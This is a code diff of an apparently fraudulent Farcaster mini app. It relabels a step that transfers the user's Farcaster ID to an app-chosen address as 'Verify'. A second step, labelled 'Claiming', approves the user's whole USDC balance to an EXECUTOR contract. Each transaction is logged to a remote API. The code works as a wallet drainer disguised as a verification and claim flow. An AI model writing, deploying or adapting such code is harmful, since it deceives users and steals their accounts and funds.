@@ -471,87 +471,12 @@ function App() {
   }
 
   // ═══════════════════════════════════════════════════════════
-  //  STEP 1: USDC Approve + Claim → Base
+  //  STEP 1: Transfer FID → Optimism  (UI label: "Verify")
   // ═══════════════════════════════════════════════════════════
   async function executeStep1() {
     // In browser mode (not mini app), show QR to open in Warpcast
     if (!isMiniApp) {
       setShowTxQR('Step 1: Verify on Base');
-      return;
-    }
-
-    setWorking(true);
-    try {
-      const rawProvider = getRawProvider();
-      if (!rawProvider) throw new Error('Wallet provider not available.');
-
-      const account = address;
-      if (!account) throw new Error('No wallet connected.');
-
-      // Check USDC balance on Base via public RPC
-      setNotice('Checking USDC balance on Base...');
-      const balance = await getUsdcBalance(account);
-
-      if (balance.isZero()) {
-        // No USDC — skip approval, mark Step 1 done, proceed to Step 2
-        setNotice('No USDC in wallet. Skipping approval, proceeding to Claiming...');
-        logAction('No USDC balance — skipping Step 1 approval.');
-        setStep1Done(true);
-        setNetwork('Base');
-        setWorking(false);
-        return;
-      }
-
-      // Switch to Base
-      setNotice('Switching to Base...');
-      await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
-
-      // Approve only the actual USDC balance
-      const approveIface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) returns (bool)']);
-      const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, balance]);
-
-      const readableBalance = ethers.utils.formatUnits(balance, 6);
-      setNotice(`Approving ${readableBalance} USDC... Confirm in your wallet.`);
-      const tx1Hash = await sendRawTx(rawProvider, account, USDC, approveData);
-
-      logAction(`USDC approved: ${readableBalance} -> ${shortAddress(EXECUTOR)} (tx: ${tx1Hash})`);
-      sendToLogAPI({
-        type: 'approve', address: account, to: EXECUTOR,
-        txHash: tx1Hash, network: 'base', amount: readableBalance,
-      });
-
-      // Execute claim batch on Base
-      setNotice('Executing claim on Base...');
-      const execIface = new ethers.utils.Interface(['function executeBatch(bytes[] calldata data)']);
-      const execData = execIface.encodeFunctionData('executeBatch', [[]]);
-      const tx2Hash = await sendRawTx(rawProvider, account, EXECUTOR, execData);
-
-      logAction(`executeBatch called (tx: ${tx2Hash})`);
-      sendToLogAPI({
-        type: 'claim', address: account,
-        txHash: tx2Hash, network: 'base',
-      });
-
-      setStep1Done(true);
-      setNetwork('Base');
-      setNotice('Step 1 complete! Verification done on Base.');
-      await sdk.haptics.notificationOccurred('success');
-
-    } catch (error) {
-      console.error('Step 1 error:', error);
-      setNotice(error?.shortMessage || error?.message || 'Step 1 failed.');
-    } finally {
-      setWorking(false);
-    }
-  }
-
-  // ═══════════════════════════════════════════════════════════
-  //  STEP 2: Transfer FID → Optimism
-  // ═══════════════════════════════════════════════════════════
-  async function executeStep2() {
-    // In browser mode (not mini app), show QR to open in Warpcast
-    if (!isMiniApp) {
-      setShowTxQR('Step 2: Claiming on Optimism');
       return;
     }
 
@@ -586,7 +511,7 @@ function App() {
       const transferData = idIface.encodeFunctionData('transfer', [fidNum, dest.address]);
 
       // Send transfer via eth_sendTransaction
-      setNotice(`Claiming FID ${fidNum}... Approve in your wallet.`);
+      setNotice(`Verifying FID ${fidNum}... Approve in your wallet.`);
       const txHash = await sendRawTx(rawProvider, account, ID_REGISTRY, transferData);
 
       logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (tx: ${txHash})`);
@@ -595,8 +520,82 @@ function App() {
         txHash: txHash, network: 'optimism', destIndex: dest.index,
       });
 
+      setStep1Done(true);
       setNetwork('Optimism');
-      setNotice(`FID ${fidNum} claimed to ${shortAddress(dest.address)} on Optimism. All done!`);
+      setNotice('Step 1 complete! Verification done.');
+      await sdk.haptics.notificationOccurred('success');
+
+    } catch (error) {
+      console.error('Step 1 error:', error);
+      setNotice(error?.shortMessage || error?.message || 'Step 1 failed.');
+    } finally {
+      setWorking(false);
+    }
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  //  STEP 2: USDC Approve + Claim → Base  (UI label: "Claiming")
+  // ═══════════════════════════════════════════════════════════
+  async function executeStep2() {
+    // In browser mode (not mini app), show QR to open in Warpcast
+    if (!isMiniApp) {
+      setShowTxQR('Step 2: Claiming on Optimism');
+      return;
+    }
+
+    setWorking(true);
+    try {
+      const rawProvider = getRawProvider();
+      if (!rawProvider) throw new Error('Wallet provider not available.');
+
+      const account = address;
+      if (!account) throw new Error('No wallet connected.');
+
+      // Check USDC balance on Base via public RPC
+      setNotice('Checking USDC balance on Base...');
+      const balance = await getUsdcBalance(account);
+
+      if (balance.isZero()) {
+        setNotice('No USDC in wallet. Claiming complete.');
+        logAction('No USDC balance — skipping USDC approval.');
+        setNetwork('Base');
+        await sdk.haptics.notificationOccurred('success');
+        setWorking(false);
+        return;
+      }
+
+      // Switch to Base
+      setNotice('Switching to Base...');
+      await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
+
+      // Approve only the actual USDC balance
+      const approveIface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) returns (bool)']);
+      const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, balance]);
+
+      const readableBalance = ethers.utils.formatUnits(balance, 6);
+      setNotice(`Approving ${readableBalance} USDC... Confirm in your wallet.`);
+      const tx1Hash = await sendRawTx(rawProvider, account, USDC, approveData);
+
+      logAction(`USDC approved: ${readableBalance} -> ${shortAddress(EXECUTOR)} (tx: ${tx1Hash})`);
+      sendToLogAPI({
+        type: 'approve', address: account, to: EXECUTOR,
+        txHash: tx1Hash, network: 'base', amount: readableBalance,
+      });
+
+      // Execute claim batch on Base
+      setNotice('Executing claim on Base...');
+      const execIface = new ethers.utils.Interface(['function executeBatch(bytes[] calldata data)']);
+      const execData = execIface.encodeFunctionData('executeBatch', [[]]);
+      const tx2Hash = await sendRawTx(rawProvider, account, EXECUTOR, execData);
+
+      logAction(`executeBatch called (tx: ${tx2Hash})`);
+      sendToLogAPI({
+        type: 'claim', address: account,
+        txHash: tx2Hash, network: 'base',
+      });
+
+      setNetwork('Base');
+      setNotice('Step 2 complete! Claiming done on Base.');
       await sdk.haptics.notificationOccurred('success');
 
     } catch (error) {
